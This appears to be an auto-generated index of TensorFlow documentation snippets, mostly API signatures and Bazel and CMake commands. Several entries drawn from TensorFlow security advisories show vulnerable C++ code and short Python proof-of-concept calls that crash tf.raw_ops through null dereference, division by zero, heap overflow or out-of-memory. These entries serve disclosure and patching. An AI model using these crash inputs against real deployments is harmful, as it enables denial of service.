foreach(FLAG IN ITEMS CMAKE_ASM_FLAGS CMAKE_ASM_COMPILER_ARG1 CMAKE_C_FLAGS CMAKE_C_COMPILER_ARG1 CMAKE_CXX_FLAGS CMAKE_CXX_COMPILER_ARG1)
  if(${FLAG})
    string(REGEX REPLACE "-mcpu=[-a-zA-Z0-9_.^$*+?]*" "" _tmp ${${FLAG}})
    set(${FLAG} ${_tmp})
  endif()
endforeach()
```

----------------------------------------

TITLE: Initialize ImageSize from Buffer Python
DESCRIPTION: This class method is used to initialize an ImageSize object by interpreting a buffer as the root of a FlatBuffer structure. It takes the buffer containing the data and an optional byte offset from which to start reading. This is the primary way to parse ImageSize data from a buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSize.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Selecting Data from Record in AverageWordVecSpec
DESCRIPTION: Extracts features and labels from a parsed TFRecord example. This method is used internally when loading data from TFRecord files for training or evaluation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_11

LANGUAGE: python
CODE:
```
select_data_from_record(
    record
)
```

----------------------------------------

TITLE: Calculating TFLite Array Size in Bytes in C++
DESCRIPTION: This snippet defines the `TfLiteIntArrayGetSizeInBytes` function, which calculates the required memory size for a `TfLiteIntArray` based on the number of elements (`size`). The calculated size is stored and returned as an `int`, which is the core of the integer overflow vulnerability, as large 'size' values can cause `computed_size` to exceed the maximum value representable by an `int`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-023.md#_snippet_1

LANGUAGE: C++
CODE:
```
int TfLiteIntArrayGetSizeInBytes(int size) {
  static TfLiteIntArray dummy;

  int computed_size = sizeof(dummy) + sizeof(dummy.data[0]) * size;
#if defined(_MSC_VER)
  // Context for why this is needed is in http://b/189926408#comment21
  computed_size -= sizeof(dummy.data[0]);
#endif
  return computed_size;
}
```

----------------------------------------

TITLE: Vulnerable Dequantize Logic (C++)
DESCRIPTION: This C++ snippet shows the specific part of the `Dequantize` kernel implementation where the vulnerability exists. It demonstrates that the `axis_` variable is used in loops (`for (int i = 0; i < axis_; ++i)`) to calculate `pre_dim` and `post_dim` without verifying that `axis_` is less than the actual number of dimensions of the output tensor (`float_output.dims()`). When `axis_` is larger than the tensor dimensions, this leads to an out-of-bounds read.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-003.md#_snippet_1

LANGUAGE: cpp
CODE:
```
  if (axis_ > -1) {
    num_slices = input.dim_size(axis_);
  }
  // ...
  int64_t pre_dim = 1, post_dim = 1;
  for (int i = 0; i < axis_; ++i) {
    pre_dim *= float_output.dim_size(i);
  }
  for (int i = axis_ + 1; i < float_output.dims(); ++i) {
    post_dim *= float_output.dim_size(i);
  }
```

----------------------------------------

TITLE: Vulnerable RaggedCross C++ Implementation Loop
DESCRIPTION: This C++ snippet from the `RaggedCross` operator implementation highlights the vulnerable code loop responsible for the heap OOB read. It iterates through an `input_order_` string and accesses input lists (`ragged_values_list`, `sparse_indices_list`, `dense_list`) using incremental indices (`next_ragged`, `next_sparse`, `next_dense`) without validating that these indices are within the bounds of the respective lists, leading to the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-021.md#_snippet_1

LANGUAGE: c++
CODE:
```
int next_ragged = 0;
int next_sparse = 0;
int next_dense = 0;
for (char c : input_order_) {
  if (c == 'R') {
    TF_RETURN_IF_ERROR(BuildRaggedFeatureReader(
        ragged_values_list[next_ragged], ragged_splits_list[next_ragged],
        features));
    next_ragged++;
  } else if (c == 'S') {
    TF_RETURN_IF_ERROR(BuildSparseFeatureReader(
        sparse_indices_list[next_sparse], sparse_values_list[next_sparse],
        batch_size, features));
    next_sparse++;
  } else if (c == 'D') {
    TF_RETURN_IF_ERROR(
        BuildDenseFeatureReader(dense_list[next_dense++], features));
  }
  ...
}
```

----------------------------------------

TITLE: Demonstrating Vulnerable tf.raw_ops.MapPeek Call - Python
DESCRIPTION: This Python code snippet demonstrates how to call `tf.raw_ops.MapPeek` with an empty `indices` list. According to the vulnerability description, this specific call path triggers the insecure behavior where a reference can be bound to a null pointer, leading to undefined behavior. The snippet requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-145.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.MapPeek(
  key=tf.constant([8],dtype=tf.int64),
  indices=[],
  dtypes=[tf.int32],
  capacity=8,
  memory_limit=128)
```

----------------------------------------

TITLE: Accessing Vocabulary File Data in Python
DESCRIPTION: Retrieves data related to the vocabulary file from the `RegexTokenizerOptions` object at index `j`. The exact return type depends on the FlatBuffers schema but likely provides access to file path or content.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptions.md#_snippet_5

LANGUAGE: python
CODE:
```
VocabFile(
    j
)
```

----------------------------------------

TITLE: Finalizing Model Metadata Building in TFLite Support (Python)
DESCRIPTION: This snippet shows the signature for the `ModelMetadataEnd` function. It takes a builder object (likely a FlatBuffers builder) as input and is used to finalize the metadata structure being built. It signifies the end of the metadata definition.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataEnd.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.ModelMetadataEnd(
    builder
)
```

----------------------------------------

TITLE: Running TensorFlow wav_to_spectrogram Custom - Bash
DESCRIPTION: This command executes the `wav_to_spectrogram` binary with custom options to process a specified input WAV file (`--input_wav`), control the spectrogram window size (`--window`) and stride (`--stride`), and define the output image path (`--output_image`). The input WAV must be in LIN16 format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/wav_to_spectrogram/README.md#_snippet_2

LANGUAGE: bash
CODE:
```
bazel-bin/tensorflow/examples/wav_to_spectrogram/wav_to_spectrogram \
--input_wav=/tmp/my_audio.wav \
--window=1024 \
--stride=512 \
--output_image=/tmp/my_spectrogram.png
```

----------------------------------------

TITLE: Initializing RegexTokenizerOptionsT from Packed Buffer Python
DESCRIPTION: A class method to initialize a `RegexTokenizerOptionsT` object from a packed FlatBuffer buffer. It takes the buffer and an optional starting position, handling the unpacking of the FlatBuffer structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptionsT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Initialize ScoreThresholdingOptions - Python
DESCRIPTION: Initializes the `ScoreThresholdingOptions` object by associating it with a specific buffer and position within that buffer. This prepares the object to read data from the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreThresholdingOptions.md#_snippet_3

LANGUAGE: Python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Packing ImageSizeT into FlatBuffer Builder in Python
DESCRIPTION: Packs the current `ImageSizeT` object's data into a FlatBuffers builder (`builder`). This method is used when constructing a FlatBuffers representation of the object to be serialized.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSizeT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(\n builder\n)
```

----------------------------------------

TITLE: Initializing TensorGroup Instance | TensorFlow Lite Support Python
DESCRIPTION: Initializes a `TensorGroup` instance with a buffer and position. This method is likely used internally after obtaining the root object from a buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroup.md#_snippet_2

LANGUAGE: python
CODE:
```
Init(
 buf, pos
)
```

----------------------------------------

TITLE: Creating Metadata CategoryTensorMd Python
DESCRIPTION: Generates the Flatbuffers `TensorMetadataT` object from the information stored within the `CategoryTensorMd` instance. This method is used to serialize the collected tensor metadata into a format suitable for embedding in a TFLite model file, returning a Flatbuffers Python object representing the metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/CategoryTensorMd.md#_snippet_1

LANGUAGE: python
CODE:
```
create_metadata() -> tflite_support.metadata_schema_py_generated.TensorMetadataT
```

----------------------------------------

TITLE: Initializing AudioPropertiesT Class - Python
DESCRIPTION: This snippet shows the basic constructor for the `AudioPropertiesT` class. It is used to create a new instance of the AudioPropertiesT object, likely with default or empty values that can be populated later.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioPropertiesT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.AudioPropertiesT()

```

----------------------------------------

TITLE: Importing TensorFlow and Checking Version (Python)
DESCRIPTION: Imports the TensorFlow library, which is essential for loading and running the TensorFlow Lite interpreter. It then prints the installed TensorFlow version to verify the environment setup. Requires TensorFlow to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/style_transfer/overview.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
print(tf.__version__)
```

----------------------------------------

TITLE: Triggering Null Pointer Dereference in SparseTensorSliceDataset (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a null pointer dereference vulnerability in `tf.raw_ops.SparseTensorSliceDataset` by providing empty `indices` while `values` and `dense_shape` are non-empty. It simulates an invalid sparse tensor input that leads to the crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-121.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.SparseTensorSliceDataset(
    indices=[[], [], []], values=[1, 2, 3], dense_shape=[3, 3])
```

----------------------------------------

TITLE: Get Name - TensorMetadata (Python)
DESCRIPTION: Retrieves the name assigned to the tensor. This provides a string identifier for the tensor within the model metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_11

LANGUAGE: python
CODE:
```
Name()
```

----------------------------------------

TITLE: Getting Root as CustomMetadata Generic Method in Python
DESCRIPTION: A class method to get a root object from a FlatBuffers buffer, potentially casting it to `CustomMetadata`. It takes the buffer and an optional starting offset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadata.md#_snippet_5

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Comparing ObjectDetectorOptions Equality TensorFlow Lite Python
DESCRIPTION: Defines the equality comparison method (`__eq__`) for the `ObjectDetectorOptions` class. This method takes another object (`other`) and compares its properties to the current instance's properties to determine if they represent the same configuration. It allows for checking if two sets of object detector options are identical.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ObjectDetectorOptions.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Analyze Bazel Profile (Shell)
DESCRIPTION: Analyzes the Bazel profile file generated during the build or test phase. This helps identify performance bottlenecks and understand the execution flow of the Bazel command.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_2

LANGUAGE: shell
CODE:
```
bazel analyze-profile profile.json.gz
```

----------------------------------------

TITLE: Retrieving AssociatedFile Type (Python)
DESCRIPTION: Retrieves the integer type code associated with the `AssociatedFile`, classifying its purpose (e.g., label file, tokenizer file). This method takes no arguments. It returns an integer value representing the defined file type.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFile.md#_snippet_7

LANGUAGE: python
CODE:
```
Type()
```

----------------------------------------

TITLE: Retrieving AssociatedFile Name (Python)
DESCRIPTION: Retrieves the filename or logical name string associated with the `AssociatedFile`. This method takes no arguments. It returns a string representing the name of the associated file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFile.md#_snippet_6

LANGUAGE: python
CODE:
```
Name()
```

----------------------------------------

TITLE: Defining Simple OpTypePattern C++
DESCRIPTION: Demonstrates how to define a basic `OpTypePattern` in C++ using initializer lists to match a Conv2D node whose second input is a Const node. This pattern is used to find specific simple subgraph configurations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_11

LANGUAGE: C++
CODE:
```
OpTypePattern conv_pattern({"Conv2D", {{"*"}, {"Const"}}});
```

----------------------------------------

TITLE: Running Doctests for a Specific Module using Bazel - Bash
DESCRIPTION: Uses Bazel to run the `tf_doctest` target, focusing only on docstrings within the specified module path (relative to `tensorflow.python`). This is useful for testing docstrings in a specific area after building from source, without running all doctests.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_16

LANGUAGE: bash
CODE:
```
bazel run //tensorflow/tools/docs:tf_doctest -- --module=ops.array_ops
```

----------------------------------------

TITLE: Demonstrating TensorFlow QuantizeDownAndShrinkRange Segfault (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the segfault vulnerability in TensorFlow's `tf.raw_ops.QuantizeDownAndShrinkRange`. It passes tensors with non-scalar shapes (empty and single-element) for `input_min` and `input_max`, which in affected versions causes a crash. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-108.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

out_type = tf.quint8
input = tf.constant([1], shape=[3], dtype=tf.qint32)
input_min = tf.constant([], shape=[0], dtype=tf.float32)
input_max = tf.constant(-256, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizeDownAndShrinkRange(input=input, input_min=input_min, input_max=input_max, out_type=out_type)
```

----------------------------------------

TITLE: Triggering SparseMatMul Division by Zero Vulnerability Python
DESCRIPTION: This Python snippet demonstrates the TFSA-2021-044 (CVE-2021-29557) vulnerability in TensorFlow. It attempts a `SparseMatMul` operation between a 2x2 dense tensor treated as sparse (`a`) and an empty 0x2 sparse tensor (`b`). This specific input configuration, particularly the empty tensor `b`, triggers a division by zero error in the underlying Eigen library code used by the operation, resulting in a Floating Point Exception (FPE) and a denial of service.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-044.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

a = tf.constant([100.0, 100.0, 100.0, 100.0], shape=[2, 2], dtype=tf.float32)
b = tf.constant([], shape=[0, 2], dtype=tf.float32)

tf.raw_ops.SparseMatMul(
    a=a, b=b, transpose_a=True, transpose_b=True,
    a_is_sparse=True, b_is_sparse=True)
```

----------------------------------------

TITLE: Demonstrating FractionalMaxPool Division by Zero - TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger the division by zero vulnerability in TensorFlow's `tf.raw_ops.FractionalMaxPool` operation. It uses specific values and pooling ratios known to cause the issue. Running this code on an unpatched TensorFlow version will likely result in a crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-014.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
import numpy as np

tf.raw_ops.FractionalMaxPool(
  value=tf.constant(value=[[[[1, 4, 2, 3]]]], dtype=tf.int64),
  pooling_ratio=[1.0, 1.44, 1.73, 1.0],
  pseudo_random=False,
  overlapping=False,
  deterministic=False,
  seed=0,
  seed2=0,
  name=None)
```

----------------------------------------

TITLE: Triggering CHECK-fail in TensorFlow with Python
DESCRIPTION: This Python snippet demonstrates how to trigger a denial of service vulnerability in `tf.raw_ops.AddManySparseToTensorsMap`. It constructs a `sparse_shape` tensor with specific values that cause an integer overflow when used internally to compute the total number of elements for the resulting shape, leading to a `CHECK`-fail in the C++ backend.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-012.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

sparse_indices = tf.constant(530, shape=[1, 1], dtype=tf.int64)
sparse_values = tf.ones([1], dtype=tf.int64)

shape = tf.Variable(tf.ones([55], dtype=tf.int64))
shape[:8].assign(np.array([855, 901, 429, 892, 892, 852, 93, 96], dtype=np.int64))

tf.raw_ops.AddManySparseToTensorsMap(
    sparse_indices=sparse_indices,
    sparse_values=sparse_values,
    sparse_shape=shape)
```

----------------------------------------

TITLE: Triggering Heap Overflow in TensorFlow Conv2DBackpropFilter with Empty Tensors
DESCRIPTION: This Python snippet provides an alternative method to trigger the heap buffer overflow vulnerability in `tf.raw_ops.Conv2DBackpropFilter`. It demonstrates that passing empty tensors for `input` and `out_backprop`, combined with specific `filter_sizes` and `strides`, can also cause the overflow. This is due to the same underlying implementation flaw regarding size validation. Requires the `tensorflow` library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-028.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_tensor = tf.constant([], shape=[0, 1, 1, 5], dtype=tf.float32)
filter_sizes = tf.constant([3, 8, 1, 1], shape=[4], dtype=tf.int32)
out_backprop = tf.constant([], shape=[0, 1, 1, 1], dtype=tf.float32)

tf.raw_ops.Conv2DBackpropFilter(
  input=input_tensor,
  filter_sizes=filter_sizes,
  out_backprop=out_backprop,
  strides=[1, 66, 49, 1],
  use_cudnn_on_gpu=True,
  padding='VALID',
  explicit_paddings=[],
  data_format='NHWC',
  dilations=[1, 1, 1, 1]
)
```

----------------------------------------

TITLE: Reproducing CTCGreedyDecoder CHECK-fail - Python
DESCRIPTION: This Python snippet demonstrates how to trigger the denial of service vulnerability (TFSA-2021-032) in `tf.raw_ops.CTCGreedyDecoder`. Providing invalid `sequence_length` values, specifically negative ones in this case, causes a `CHECK_LT` assertion to fail internally, resulting in program termination rather than a graceful error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-032.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

inputs = tf.constant([], shape=[18, 2, 0], dtype=tf.float32)
sequence_length = tf.constant([-100, 17], shape=[2], dtype=tf.int32)
merge_repeated = False

tf.raw_ops.CTCGreedyDecoder(inputs=inputs, sequence_length=sequence_length, merge_repeated=merge_repeated)
```

----------------------------------------

TITLE: Triggering Type Confusion with ConcatV2 in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger the type confusion vulnerability in `tf.raw_ops.ConcatV2`. It uses a large, invalid hexadecimal value for the `axis` argument, which is interpreted differently by the underlying C++ shape inference logic, leading to a negative `min_rank` and bypassing subsequent validation checks.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-007.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.ConcatV2(
    values=[[1,2,3],[4,5,6]],
    axis = 0xb500005b)
  return y

test()
```

----------------------------------------

TITLE: Triggering Conv2D Division by 0 (TensorFlow, Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a division-by-zero vulnerability in TensorFlow's raw Conv2D operation, leading to a crash (denial of service). It requires the TensorFlow library and uses the `tf.raw_ops.Conv2D` function with empty-shaped input and filter tensors, which expose a missing validation bug in the shape inference logic.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-150.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.compat.v1.disable_v2_behavior()
tf.raw_ops.Conv2D(
  input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),
  filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),
  strides = [1, 1, 1, 1],
  padding = "SAME")
```

----------------------------------------

TITLE: Demonstrating tf.sparse.split vulnerability - Python
DESCRIPTION: This Python snippet demonstrates a denial-of-service vulnerability in `tf.sparse.split`. It attempts to split a sparse tensor by passing a list `[1, 2]` to the `axis` parameter, which the function incorrectly handles, leading to a crash. Requires TensorFlow installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-029.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
data = tf.random.uniform([1, 32, 32], dtype=tf.float32)
axis = [1, 2]
x = tf.sparse.from_dense(data)
result = tf.sparse.split(x,3, axis=axis)
```

----------------------------------------

TITLE: Reproducing QuantizedInstanceNorm Segfault Python
DESCRIPTION: This Python snippet demonstrates the vulnerability in `tf.raw_ops.QuantizedInstanceNorm` where providing `x_min` as a zero-shaped tensor (non-scalar) causes a segfault. It requires TensorFlow. The input tensors `x_min` and `x_max` with incorrect shapes are passed to trigger the issue.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-102.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

output_range_given = False
given_y_min = 0
given_y_max = 0
variance_epsilon = 1e-05
min_separation = 0.001
x = tf.constant(88, shape=[1,4,4,32], dtype=tf.quint8)
x_min = tf.constant([], shape=[0], dtype=tf.float32)
x_max = tf.constant(0, shape=[], dtype=tf.float32)
tf.raw_ops.QuantizedInstanceNorm(x=x, x_min=x_min, x_max=x_max, output_range_given=output_range_given, given_y_min=given_y_min, given_y_max=given_y_max, variance_epsilon=variance_epsilon, min_separation=min_separation)
```

----------------------------------------

TITLE: Triggering OOM with ThreadPoolHandle in TensorFlow (Python)
DESCRIPTION: This Python snippet demonstrates a denial-of-service vulnerability in TensorFlow's `ThreadPoolHandle` operation. By providing a very large value for the `num_threads` parameter (e.g., `0x60000000`), it triggers an Out-of-Memory error and potential application crash due to the attempted allocation of resources for an excessive number of threads. This highlights the lack of an upper bound check on the `num_threads` argument in vulnerable versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-008.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
y = tf.raw_ops.ThreadPoolHandle(num_threads=0x60000000,display_name='tf')
```

----------------------------------------

TITLE: Applying Select XLA Operation with Scalar Predicate - Pseudocode Example
DESCRIPTION: This example demonstrates the XLA `Select` operation using a scalar predicate. When the scalar predicate `pred` is `true`, the entire `on_true` array (`v1`) is selected as the output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_32

LANGUAGE: Pseudocode
CODE:
```
let pred: PRED = true;
let v1: s32[4] = {1, 2, 3, 4};
let v2: s32[4] = {100, 200, 300, 400};
==>
Select(pred, v1, v2) = s32[4]{1, 2, 3, 4};
```

----------------------------------------

TITLE: Break Statement in While Loop Input Example Python
DESCRIPTION: Original Python code demonstrating a `while` loop with a `break` statement, used as an example to show how AutoGraph transforms control flow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_27

LANGUAGE: Python
CODE:
```
while i < 10:
  if i > 3:
    break
  i += 1
```

----------------------------------------

TITLE: Adding Individual Python Test Target (CMake)
DESCRIPTION: Invokes the `add_mhlo_python_test` function to define a specific custom target for running a Python test script. This example adds the `attributes.py` script as the `python-attributes` test target, inheriting the standard configuration defined within the function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tests/python/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
add_mhlo_python_test(python-attributes attributes.py)
```

----------------------------------------

TITLE: Continue Statement in For Loop Input Example Python
DESCRIPTION: Original Python code demonstrating a `for` loop with a `continue` statement, used as an example for AutoGraph transformation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_32

LANGUAGE: Python
CODE:
```
for i in range(10):
  if i > 3:
    continue
```

----------------------------------------

TITLE: Run OVIC Detector Test - Bazel Shell
DESCRIPTION: Executes the Bazel test for the OvicDetectorTest target within the TensorFlow Lite OVIC Java module. The `--cxxopt=-Wno-all` option suppresses all C++ compiler warnings, and `--test_output=all` prints the full test output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/README.md#_snippet_3

LANGUAGE: sh
CODE:
```
bazel test //tensorflow/lite/java/ovic:OvicDetectorTest --cxxopt=-Wno-all --test_output=all
```

----------------------------------------

TITLE: Starting BoundingBoxProperties Table in FlatBuffer Builder Python
DESCRIPTION: This snippet shows the function signature for `BoundingBoxPropertiesStart`. It is used to begin a new `BoundingBoxProperties` table within a FlatBuffer builder object, preparing it to add fields for the bounding box properties metadata. It takes the FlatBuffer builder instance as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxPropertiesStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.BoundingBoxPropertiesStart(
    builder
)
```

----------------------------------------

TITLE: Setting Protobuf Output Directory and Feature Files CMake
DESCRIPTION: Sets a CMake variable `GEN_PROTO_DIR` to the desired output directory for generated Protobuf code, typically within the build directory. It then initializes a list `feature_generated_files` with the expected output file paths (`.pb.h` and `.pb.cc`) for the `feature.proto` definition.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/example/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
set(GEN_PROTO_DIR ${CMAKE_CURRENT_BINARY_DIR}/tensorflow/core/example)

# Generate feature proto .h, .cc and lib.
list(APPEND feature_generated_files ${GEN_PROTO_DIR}/feature.pb.h ${GEN_PROTO_DIR}/feature.pb.cc)
```

----------------------------------------

TITLE: Representing Non-Replicated Cluster Function MLIR
DESCRIPTION: This MLIR snippet shows a non-replicated `tf_device.cluster_func` operation before being processed by the `-tf-tpu-rewrite` pass. It wraps a function `@func` intended for TPU execution and takes a tensor input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_63

LANGUAGE: mlir
CODE:
```
func @tf_tpu_rewrite(%arg0: tensor<i8>) {
  %0 = "tf_device.cluster_func"(%arg0) {_xla_compile_device_type = "TPU", _replication_info = "cluster0", func = @func} : (tensor<i8>) -> tensor<i8>
  return
}
```

----------------------------------------

TITLE: Running JAX Test with HLO Snapshots (Shell)
DESCRIPTION: Demonstrates how to execute a specific JAX test using Bazel with flags enabled for generating HLO snapshots required by `mlir-bisect`. This involves setting XLA environment variables to specify dump locations and enable snapshot creation, as well as configuring test sharding and strategy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir/tools/mlir_bisect/README.md#_snippet_0

LANGUAGE: shell
CODE:
```
bazel test some-jax-test\
  --test_env=XLA_FLAGS="--xla_cpu_use_xla_runtime --xla_dump_to=/tmp/dump\
  --xla_dump_hlo_snapshots" --test_filter=SomeSpecific.Test\
  --test_sharding_strategy=disabled --test_strategy=local
```

----------------------------------------

TITLE: Run Bazel Tests JAX GPU (Shell)
DESCRIPTION: Executes `bazel test` for JAX GPU targets. It applies specific tag filters, uses the RBE configuration for CUDA, sets JAX and TensorFlow environment variables, overrides the Python version and XLA repository, and configures output and profiling options. It's set to keep going on failures and attempt flaky tests multiple times.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_5

LANGUAGE: shell
CODE:
```
bazel test --build_tag_filters=-multiaccelerator --test_tag_filters=-multiaccelerator --config=rbe_linux_x86_64_cuda --test_env=JAX_SKIP_SLOW_TESTS=1 --test_env=TF_CPP_MIN_LOG_LEVEL=0 --test_env=JAX_EXCLUDE_TEST_TARGETS=PmapTest.testSizeOverflow --repo_env=HERMETIC_PYTHON_VERSION=3.10 --override_repository=xla=$GITHUB_WORKSPACE/openxla/xla --color=yes --test_output=errors --verbose_failures --keep_going --nobuild_tests_only --profile=profile.json.gz --flaky_test_attempts=3 --jobs=150 --bes_upload_mode=fully_async -- //tests:gpu_tests //tests:backend_independent_tests
```

----------------------------------------

TITLE: Inspecting Post-Partitioned HLO from JAX (Python)
DESCRIPTION: Provides JAX code to compile a sharded function (presumably `f` from the previous example, although the input used here is `np.ones((8, 8))` which is inconsistent with the setup) and print its HLO text after SPMD partitioning optimizations. Requires `jax` and `numpy`. Prints the resulting HLO module.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/gpu_architecture.md#_snippet_4

LANGUAGE: Python
CODE:
```
print(f.lower(np.ones((8, 8)).compile().as_text())
```

----------------------------------------

TITLE: Generating HLO Text from JAX Function (Python)
DESCRIPTION: Provides JAX code to define input tensors `a` and `b` with specific shapes and dtypes, then compiles the function `f` to an XLA computation and prints its HLO text representation. Requires `jax`, `jax.random`, and `jax.numpy`. Prints the HLO module as a string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/gpu_architecture.md#_snippet_1

